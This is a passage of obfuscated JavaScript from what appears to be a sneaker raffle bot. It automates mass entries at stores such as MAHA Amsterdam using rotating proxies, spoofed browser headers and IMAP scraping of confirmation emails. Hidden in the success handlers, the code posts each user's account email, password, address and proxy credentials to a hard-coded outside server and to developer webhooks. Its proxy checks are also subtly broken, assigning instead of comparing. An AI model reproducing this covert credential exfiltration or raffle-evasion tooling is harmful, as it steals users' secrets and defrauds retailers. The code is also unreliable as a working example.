                                    'value': '' + _0x2a5254[_0x1fcfff]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x24de00['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e0c2d
                                }
                            ]
                        }];
                        let _0x11c9be = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x238ad6 = ![];
                        for (key of _0x11c9be) {
                            if (_0x2a5254[_0x1fcfff][key] == '' || !_0x2a5254[_0x1fcfff][key]) {
                                console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x238ad6 = !![];
                                break;
                            }
                        }
                        if (_0x238ad6) {
                            await _0x254c61(0x1f4);
                            continue;
                        }
                        var _0x394eb7 = await _0x18ad5f(_0x2a5254[_0x1fcfff], _0x22c27d, 'dev', ![]), _0x14f0a1 = await _0x18ad5f(_0x2a5254[_0x1fcfff], _0x22c27d, 'pub', ![]);
                        const _0x1be1b1 = {
                            'succesDEVMSG': { 'embeds': [_0x394eb7] },
                            'succesPUBMSG': { 'embeds': [_0x14f0a1] }
                        };
                        try {
                            await _0x4626f3(_0x2a5254, _0x1fcfff);
                        } catch {
                            _0x6c089f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x2094c4 = _0x450771[_0x1fcfff]['split'](':');
                        else
                            var _0x45cd77 = Math['round'](Math['random']() * (_0x450771['length'] - 0x1)), _0x2094c4 = _0x450771[_0x45cd77]['split'](':');
                        var _0x3bb368;
                        try {
                            _0x3bb368 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x2094c4[0x0] + ':' + _0x2094c4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3bb368 = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x2094c4[0x0] + ':' + _0x2094c4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x45e612 = await _0x3bb368['newPage']();
                            await _0x45e612['authenticate']({
                                'username': '' + _0x2094c4[0x2],
                                'password': '' + _0x2094c4[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Getting\x20Session'), await _0x45e612['setRequestInterception'](!![]), _0x45e612['on']('request', _0x4a9689 => {
                                _0x4a9689['resourceType']() === 'image' || _0x4a9689['resourceType']() === 'font' || _0x4a9689['resourceType']() === 'media' ? _0x4a9689['abort']() : _0x4a9689['continue']();
                            }), await _0x45e612['goto']('' + _0x2a5254[_0x1fcfff]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x254c61(0x12c), await _0x45e612['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x45e612['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x254c61(0x7d0);
                            try {
                                await _0x45e612['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x45e612['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Logging\x20in'), await _0x45e612['waitForSelector']('#username'), await _0x45e612['type']('#username', _0x2a5254[_0x1fcfff]['Email']), await _0x45e612['waitForSelector']('#password'), await _0x45e612['type']('#password', _0x2a5254[_0x1fcfff]['Password']), await _0x254c61(0x190), await _0x45e612['click']('#buttonSubmit'), await _0x45e612['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Getting\x20Product'), await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2a5254[_0x1fcfff]['Size']);
                            let _0x154191 = _0x2a5254[_0x1fcfff]['Size']['replace']('.5', '\x201/2');
                            if (_0x154191['toUpperCase']() == 'RANDOM') {
                                const _0x13ce70 = await _0x45e612['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0xd83606 = Math['round'](Math['random']() * (_0x13ce70['length'] - 0x1));
                                await _0x13ce70[_0xd83606]['click']();
                            } else
                                await _0x45e612['click']('button[aria-label=\x22' + _0x154191 + '\x22]');
                            await _0x254c61(0x1f4);
                            try {
                                await _0x45e612['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x254c61(0x12c), console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Filling\x20Information'), await _0x45e612['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_addressFields_firstName', _0x2a5254[_0x1fcfff]['FirstName']), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_addressFields_lastName', _0x2a5254[_0x1fcfff]['LastName']), await _0x254c61(0x12c), await _0x45e612['select']('#dwfrm_raffle_addressFields_country', _0x2a5254[_0x1fcfff]['Country']), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_addressFields_city', _0x2a5254[_0x1fcfff]['City']), await _0x254c61(0x12c);
                            _0x2a5254[_0x1fcfff]['Postcode'] == undefined && (_0x2a5254[_0x1fcfff]['Postcode'] = _0x2a5254[_0x1fcfff]['Zip']);
                            await _0x45e612['type']('#dwfrm_raffle_addressFields_postalCode', _0x2a5254[_0x1fcfff]['Postcode']), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_addressFields_address1', _0x2a5254[_0x1fcfff]['Address1']), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_addressFields_address2', _0x2a5254[_0x1fcfff]['HouseNumber']), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x2a5254[_0x1fcfff]['Address2']), await _0x254c61(0x12c), await _0x45e612['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x254c61(0x12c), await _0x45e612['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x2a5254[_0x1fcfff]['Follower']), await _0x254c61(0x1f4), await _0x45e612['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20' + _0x467028['blue']('Awaiting\x20Paypal\x20Payment')), await _0x45e612['click']('.b-paypal_button');
                            try {
                                await _0x45e612['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x6c089f = 'no', _0x547244(_0x2a5254[_0x1fcfff], _0x22c27d), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1be1b1['succesDEVMSG']);
                                await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x1be1b1['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x1be1b1['succesPUBMSG']);
                                let _0x597206 = _0x2a5254[_0x1fcfff];
                                try {
                                    prxdata = {
                                        'username': _0x4a1218['replace']('#', ''),
                                        'module': _0x22c27d['name'],
                                        'entrydata': JSON['stringify'](_0x597206),
                                        'proxy': '' + _0x450771[_0x1fcfff]
                                    };
                                    var _0x1f7814 = JSON['stringify'](prxdata);
                                    let _0x310059 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x1f7814, _0x310059);
                                } catch (_0x396387) {
                                }
                            } catch (_0x4d2a3a) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4d2a3a)), _0x590918 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4d2a3a;
                                var _0x3877d8 = await _0x18ad5f(_0x2a5254[_0x1fcfff], _0x22c27d, 'dev', !![], _0x590918);
                                _0x1be1b1['errorDEV'] = { 'embeds': [_0x3877d8] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1be1b1['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x1be1b1['errorDEV']);
                            }
                        } catch (_0x591e9c) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20' + _0x591e9c)), _0x590918 = '' + _0x591e9c;
                            var _0x3877d8 = await _0x18ad5f(_0x2a5254[_0x1fcfff], _0x22c27d, 'dev', !![], _0x590918);
                            _0x1be1b1['errorDEV'] = { 'embeds': [_0x3877d8] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1be1b1['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x1be1b1['errorDEV']), _0x6c089f = 'yes';
                        } finally {
                            _0x3bb368 && _0x3bb368['close']();
                            if (_0x6c089f == 'yes' && _0x1b0691 != 0x5) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x22c27d['name'] + ']\x20Task\x20' + (_0x1fcfff + 0x1) + '\x20:\x20Retrying\x20(' + _0x1b0691 + '\x20/\x205)')), _0x1fcfff = _0x1fcfff - 0x1, _0x1b0691 = _0x1b0691 + 0x1;
                                continue;
                            }
                            _0x6c089f == 'yes' && _0x1b0691 >= 0x5 && (_0x9088f0(_0x2a5254[_0x1fcfff], _0x22c27d), _0x6c089f = 'no', _0x1b0691 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['AfewDelay'] + '\x20ms'), await _0x254c61(_0x24de00['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4a4d96, _0x50925d, _0x4233da) {
                    for (var _0x392111 = 0x0; _0x392111 < _0x50925d['length']; _0x392111++) {
                        try {
                            await _0x4626f3(_0x50925d, _0x392111);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4257cd(_0x5e6916, _0x342be2, _0x55d9f0, _0x430f9d, _0xa06f6b) {
                            var _0x109290, _0x9f6946 = {}, _0x1007f3 = [], _0x1c723b = {}, _0x2a9607 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x4b2897 = Math['round'](Math['random']() * (_0x2a9607['length'] - 0x1));
                            !_0x430f9d && (_0x430f9d = {});
                            if (_0x342be2 != 'ver') {
                                _0x1bf238(_0x55d9f0['name'] + '\x20Task\x20' + (_0x5e6916 + 0x1) + '\x20/\x20' + _0x430f9d['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577), await _0x4626f3(_0x430f9d, _0x5e6916), _0x9f6946 = _0x55d9f0['data'], _0x9f6946['data']['attributes']['email'] = '' + _0x430f9d[_0x5e6916]['Email'];
                                if (_0x430f9d[_0x5e6916]['Size'] == 'RANDOM') {
                                }
                                _0x9f6946['data']['attributes']['properties']['$first_name'] = '' + _0x430f9d[_0x5e6916]['FirstName'], _0x9f6946['data']['attributes']['properties']['$last_name'] = '' + _0x430f9d[_0x5e6916]['LastName'], _0x9f6946['data']['attributes']['properties']['$address1'] = _0x430f9d[_0x5e6916]['Address1'] + '\x20' + _0x430f9d[_0x5e6916]['Address2'] + '\x20' + _0x430f9d[_0x5e6916]['HouseNumber'], _0x9f6946['data']['attributes']['properties']['$zip'] = '' + _0x430f9d[_0x5e6916]['Zip'], _0x9f6946['data']['attributes']['properties']['$city'] = '' + _0x430f9d[_0x5e6916]['City'], _0x9f6946['data']['attributes']['properties']['$country'] = '' + _0x430f9d[_0x5e6916]['Country'], _0x430f9d[_0x5e6916]['Size'] == 'RANDOM' ? _0x9f6946['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2a9607[_0x4b2897] : _0x9f6946['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x430f9d[_0x5e6916]['Size'], _0x9f6946['data']['attributes']['properties']['$phone_number'] = '' + _0x430f9d[_0x5e6916]['Phone'], _0x9f6946['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x430f9d[_0x5e6916]['Follower'];
                            }
                            if (_0x24de00['useRandomProxy'] = ![])
                                var _0xb766dc = _0xa06f6b[_0x5e6916]['split'](':');
                            else
                                var _0x260973 = Math['round'](Math['random']() * (_0xa06f6b['length'] - 0x1)), _0xb766dc = _0xa06f6b[_0x260973]['split'](':');
                            var _0x239f42 = {
                                'jar': _0x3be8c2,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x55d9f0['url'],
                                'headers': _0x55d9f0['headers'],
                                'body': JSON['stringify'](_0x9f6946),
                                'proxy': 'http://' + _0xb766dc[0x2] + ':' + _0xb766dc[0x3] + '@' + _0xb766dc[0x0] + ':' + _0xb766dc[0x1]
                            };
                            return _0x342be2 != 'ver' && (_0x239f42['url'] = _0x55d9f0['url'], _0x239f42['headers'] = _0x55d9f0['headers']), _0x342be2 == 'ver' && (_0x239f42['method'] = 'GET'), new Promise(function (_0x31e282, _0x498311) {
                                callback = async (_0x42da94, _0x50e0cf, _0x467160) => {
                                    if (!_0x42da94 && _0x50e0cf['statusCode'] == 0xca || !_0x42da94 && _0x50e0cf['statusCode'] == 0xc8) {
                                        if (_0x342be2 != 'ver') {
                                            var _0x1d71b9 = await _0x18ad5f(_0x430f9d[_0x5e6916], _0x55d9f0, 'dev', ![]), _0x54677a = await _0x18ad5f(_0x430f9d[_0x5e6916], _0x55d9f0, 'pub', ![]);
                                            const _0x4041b7 = {
                                                'succesDEVMSG': { 'embeds': [_0x1d71b9] },
                                                'succesPUBMSG': { 'embeds': [_0x54677a] }
                                            };
                                            let _0x2fbc6f = _0x430f9d[_0x5e6916];
                                            try {
                                                prxdata = {
                                                    'username': _0x4a1218['replace']('#', ''),
                                                    'module': _0x55d9f0['name'],
                                                    'entrydata': JSON['stringify'](_0x2fbc6f),
                                                    'proxy': '' + _0xa06f6b[_0x5e6916]
                                                };
                                                var _0x352715 = JSON['stringify'](prxdata);
                                                let _0x56292d = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x352715, _0x56292d);
                                            } catch (_0x361f11) {
                                            }
                                            if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                                                try {
                                                    await _0x2dfd24(_0x24de00['webhook'], _0x4041b7['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x4041b7['succesDEVMSG']), await _0x254c61(0xc8);
                                            try {
                                                await _0x2dfd24(_0x4f6cb7, _0x4041b7['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x547244(_0x430f9d[_0x5e6916], _0x55d9f0);
                                        }
                                        _0x31e282(console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x55d9f0['name'] + ']\x20Task\x20' + (_0x5e6916 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x342be2 != 'ver') {
                                            var _0x13db2e = '' + _0x42da94, _0x45a8e6 = await _0x18ad5f(_0x430f9d[_0x5e6916], _0x55d9f0, 'dev', !![], _0x13db2e), _0x5820c2 = {};
                                            _0x5820c2['errorDEV'] = { 'embeds': [_0x45a8e6] }, _0x9088f0(_0x430f9d[_0x5e6916], _0x55d9f0), _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x5820c2['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x5820c2['errorDEV']);
                                        }
                                        _0x498311(console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x55d9f0['name'] + ']\x20Task\x20' + (_0x5e6916 + 0x1) + ':\x20' + _0x42da94)));
                                    }
                                };
                                try {
                                    _0x342be2 != 'ver' && console['log'](_0x36583e() + '\x20[' + _0x55d9f0['name'] + ']\x20Task\x20' + (_0x5e6916 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x9f6946['data']['attributes']['email']), _0x35812d(_0x239f42, callback);
                                } catch (_0x10b622) {
                                    console['log'](_0x36583e() + '\x20Task\x20' + (_0x5e6916 + 0x1) + ':\x20' + _0x10b622);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x4257cd(_0x392111, 'nor', _0x4a4d96, _0x50925d, _0x4233da), console['log'](_0x36583e() + '\x20[' + _0x4a4d96['name'] + ']\x20Sleeping\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        } catch (_0x13b8c7) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2b71b5, _0x39f317, _0x3bf040) {
                    var _0x1fad3d = [], _0x362ee1 = ![];
                    async function _0x33e195() {
                        var _0x54b10e = new _0x2796bc({
                            'user': _0x24de00['masterMail'],
                            'password': _0x24de00['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xf9d68b(_0x170401) {
                            _0x54b10e['openBox']('INBOX', ![], _0x170401);
                        }
                        _0x54b10e['once']('ready', function () {
                            _0xf9d68b(function (_0x2acde3, _0x526ece) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2acde3)
                                    throw _0x2acde3;
                                _0x54b10e['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x346bec, _0x4a33ee) {
                                    if (!_0x4a33ee || !_0x4a33ee['length'])
                                        console['log'](_0x36583e() + '\x20[' + _0x2b71b5['name'] + ']\x20No\x20mails\x20found'), _0x54b10e['end']();
                                    else {
                                        var _0x120eb6 = _0x54b10e['seq']['fetch'](_0x4a33ee, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x120eb6['on']('message', function (_0x519699, _0x3b17af) {
                                            var _0x3aef92 = '(#' + _0x3b17af + ')\x20';
                                            _0x519699['on']('body', function (_0x588b37, _0x4fb88e) {
                                                _0x1a979e(_0x588b37, (_0x38444e, _0x268dba) => {
                                                    var _0xb8a81b = _0x268dba['text']['split']('(')[0x1], _0x1c8312 = _0xb8a81b['split'](')')[0x0];
                                                    _0x1fad3d['push'](_0x1c8312);
                                                });
                                            }), _0x519699['once']('end', function () {
                                            });
                                        }), _0x120eb6['once']('error', function (_0x3ad22b) {
                                            console['log']('Fetch\x20error:\x20' + _0x3ad22b), _0x362ee1 = !![];
                                        }), _0x120eb6['once']('end', function () {
                                            _0x54b10e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x54b10e['once']('error', function (_0x5725e1) {
                            console['log'](_0x467028['red'](_0x5725e1['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x362ee1 = !![];
                        }), _0x54b10e['once']('end', async function () {
                            _0x362ee1 = !![];
                        }), _0x54b10e['connect']();
                    }
                    async function _0x692b89(_0x437176, _0x4aa042, _0x4b7ca6) {
                        for (var _0x38c253 = 0x0; _0x38c253 < _0x4aa042['length']; _0x38c253++) {
                            async function _0x5bf55e(_0x5cc4b8, _0x4f9ae3, _0x586d23, _0xd5d0f9, _0x26339f) {
                                var _0x21e7d4, _0x3ba8aa = {}, _0xe60d0a = [], _0x390d4f = {}, _0x45d2cb = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x15bc30 = Math['round'](Math['random']() * (_0x45d2cb['length'] - 0x1));
                                _0xd5d0f9[_0x5cc4b8]['Size'] == 'RANDOM' && (_0xd5d0f9[_0x5cc4b8]['Size'] = _0x45d2cb[_0x15bc30]);
                                !_0xd5d0f9 && (_0xd5d0f9 = {});
                                if (_0x24de00['useRandomProxy'] = ![])
                                    var _0x4b6b27 = _0x26339f[_0x5cc4b8]['split'](':');
                                else
                                    var _0x13d79c = Math['round'](Math['random']() * (_0x26339f['length'] - 0x1)), _0x4b6b27 = _0x26339f[_0x13d79c]['split'](':');
                                var _0x338eee = {
                                    'jar': _0x3be8c2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x586d23['url'],
                                    'headers': _0x586d23['headers'],
                                    'body': JSON['stringify'](_0x3ba8aa),
                                    'proxy': 'http://' + _0x4b6b27[0x2] + ':' + _0x4b6b27[0x3] + '@' + _0x4b6b27[0x0] + ':' + _0x4b6b27[0x1]
                                };
                                return _0x4f9ae3 != 'ver' && (_0x338eee['url'] = _0x586d23['url'], _0x338eee['headers'] = _0x586d23['headers']), _0x4f9ae3 == 'ver' && (_0x338eee['method'] = 'GET', _0x338eee['url'] = _0xd5d0f9[_0x5cc4b8]), new Promise(function (_0xca6d5e, _0x2ee81c) {
                                    callback = async (_0x34871e, _0x19910c, _0x2fb739) => {
                                        if (!_0x34871e && _0x19910c['statusCode'] == 0xca || !_0x34871e && _0x19910c['statusCode'] == 0xc8) {
                                            if (_0x4f9ae3 != 'ver') {
                                                var _0x323535 = await _0x18ad5f(_0xd5d0f9[_0x5cc4b8], _0x586d23, 'dev', ![]), _0x56d8ea = await _0x18ad5f(_0xd5d0f9[_0x5cc4b8], _0x586d23, 'pub', ![]);
                                                const _0x5c9a96 = {
                                                    'succesDEVMSG': { 'embeds': [_0x323535] },
                                                    'succesPUBMSG': { 'embeds': [_0x56d8ea] }
                                                };
                                                if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                                                    try {
                                                        await _0x2dfd24(_0x24de00['webhook'], _0x5c9a96['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x5c9a96['succesDEVMSG']), await _0x254c61(0xc8);
                                                try {
                                                    await _0x2dfd24(_0x4f6cb7, _0x5c9a96['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x547244(_0xd5d0f9[_0x5cc4b8], _0x586d23);
                                            }
                                            _0xca6d5e(console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x586d23['name'] + ']\x20Task\x20' + (_0x5cc4b8 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4f9ae3 != 'ver') {
                                                var _0x39a4df = '' + _0x34871e, _0x59e050 = await _0x18ad5f(_0xd5d0f9[_0x5cc4b8], _0x586d23, 'dev', !![], _0x39a4df), _0x5fab01 = {};
                                                _0x5fab01['errorDEV'] = { 'embeds': [_0x59e050] }, _0x9088f0(_0xd5d0f9[_0x5cc4b8], _0x586d23), _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x5fab01['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x5fab01['errorDEV']);
                                            }
                                            _0x2ee81c(console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x586d23['name'] + ']\x20Task\x20' + (_0x5cc4b8 + 0x1) + ':\x20' + _0x34871e)));
                                        }
                                    };
                                    try {
                                        _0x4f9ae3 != 'ver' ? console['log'](_0x36583e() + '\x20[' + _0x586d23['name'] + ']\x20Task\x20' + (_0x5cc4b8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3ba8aa['data']['attributes']['email']) : console['log'](_0x36583e() + '\x20[' + _0x586d23['name'] + ']\x20Task\x20' + (_0x5cc4b8 + 0x1) + ':\x20Fetching\x20Response'), _0x35812d(_0x338eee, callback);
                                    } catch (_0xf1fad4) {
                                        console['log'](_0x36583e() + '\x20Task\x20' + (_0x5cc4b8 + 0x1) + ':\x20' + _0xf1fad4);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5bf55e(_0x38c253, 'ver', _0x437176, _0x4aa042, _0x4b7ca6), console['log'](_0x36583e() + '\x20[' + _0x437176['name'] + ']\x20Sleeping\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                            } catch (_0x5d18d1) {
                            }
                        }
                    }
                    try {
                        _0x33e195();
                        while (!_0x362ee1) {
                            await _0x254c61(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1fad3d['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x254c61(0x9c4);
                    }
                    await _0x692b89(_0x2b71b5, _0x1fad3d, _0x3bf040);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
